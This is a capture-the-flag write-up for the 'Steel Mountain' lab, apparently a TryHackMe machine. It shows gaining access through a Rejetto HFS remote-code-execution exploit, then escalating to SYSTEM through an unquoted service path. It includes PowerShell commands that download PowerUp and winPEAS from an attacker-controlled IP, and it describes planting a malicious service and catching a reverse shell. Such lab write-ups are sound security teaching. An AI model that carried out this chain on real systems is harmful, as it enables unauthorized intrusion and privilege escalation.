---
title: 'Steel Mountain'
tags:
- writeups
---

## Recon
![[write-ups/images/Pasted image 20220821035650.png]]
- on `80` we're greeted with this => we can answer *"who's the employee of the month"*
	- ![[write-ups/images/Pasted image 20220821035600.png]]
- on `8080` we have a file server, but with nothing in it. Couldn't get anywhere by trying to login
	- ![[write-ups/images/Pasted image 20220821035833.png]]
- tried doing some enumeraation on smb as well with `enum4linux` but nothing came out
- however, looking back at the `httpd` version, which seems quite outdated, running on `8080` reveals [this exploit](https://www.exploit-db.com/exploits/39161)
 
## Init Access
So we know we have a vulnerable endpoint to RCE due to a poor regex in the file `ParserLib.pas`. It achieves this by leveraging the HFS scripting commands by using `'%00'` to bypass the filtering. We could use the metasploit module `exploit/windows/http/rejetto_hfs_exec`, but since we already got the python script let's just try that. 

It's specifying that we need to serve [nc.exe](https://github.com/int0x33/nc.exe/), so I spun up a python http server: `python -m http.server 80`, change the ip & port inside the script and just ran it:

![[write-ups/images/Pasted image 20220821041339.png]]

## Privesc w Unquoted Service Path
They insist on enumerating the machine using [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) so I did that, but also ran [winPeas](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat).
```bash
powershell -Command Invoke-WebRequest -Uri http://10.18.12.227/PowerUp.ps1 -OutFile pup.ps1
powershell -Command Invoke-WebRequest -Uri http://10.18.12.227/winPeas.bat -OutFile wpes.bat
```

```batch
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Both detect the usage of [[Unqoted Service Paths]] which can lead to privilege escalation by replacing the legitimate service with our own. Also note the `CanRestart: true` option. This will trigger our infected program & will get us a system shell

![[write-ups/images/Pasted image 20220821044432.png]]

First we gotta generate the malicious service & upload to target *([Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2))*

![[write-ups/images/Pasted image 20220821044954.png]]

 From here we need to determine where do we put this. We know that our service is in `C:\Program Files (x86)\IObit\Advanced SystemCare\` => anywhere before it should work. Since in `Program Files (x86)` we don't have write access, the most convenient option is in `IObit`. Then we setup our listener & restart the service
 
![[write-ups/images/Pasted image 20220821051303.png]]

![[write-ups/images/Pasted image 20220821051411.png]]


## Refs
- [Windows Privilege Escalation - Unquoted Service Path](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)

## See Also
- [[sheets/Unqoted Service Paths]]
- [[write-ups/THM]]